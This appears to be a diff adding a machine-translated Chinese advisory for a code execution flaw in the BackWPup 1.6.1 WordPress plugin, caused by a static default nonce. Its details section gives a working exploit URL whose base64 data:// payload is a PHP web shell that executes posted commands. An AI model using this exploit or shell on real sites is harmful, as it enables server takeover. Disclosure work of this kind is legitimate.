@@ -1,0 +1,36 @@
+WordPress插件BackWPup远程和本地代码执行漏洞
+
+漏洞详情
+
+披露状态：
+
+
+
+2011-03-28： 积极联系厂商并且等待厂商认领中，细节不对外公开
+2011-03-29： 厂商已经主动忽略漏洞，细节向公众公开
+
+
+简要描述：
+
+一个漏洞被发现在WordPress的插件BackWPup
+ 1.6.1可利用网页上执行本地或远程代码
+ 服务器。 输入传递到组件“wp_xml_export.php”通过
+ “wpabs”变量允许纳入和执行本地或远程
+ PHP文件，只要有“_nonce”的价值是众所周知的。 在“_nonce”的价值
+ 依赖于一个静态常量这不是在脚本中定义的含义
+ 它默认值“822728c8d9”。
+ 
+
+详细说明：
+
+wp_xml_export.php?_nonce=822728c8d9&wpabs=data://text/plain;base64,PGZ
+ vcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2bIiBtZX 
+Rob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4Ij48aW5wdXQgdHlwZT0 
+ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0%2bPHByZT48PyAKZWNobyBgeyRfUE9TVF
+ sneCddfWA7ID8%2bPC9wcmU%2bPD8gZGllKCk7ID8%2bCgo%3d
+ 
+
+漏洞证明：
+
+受影响的版本。 1.6.1（验证），可能还有其他
+ 
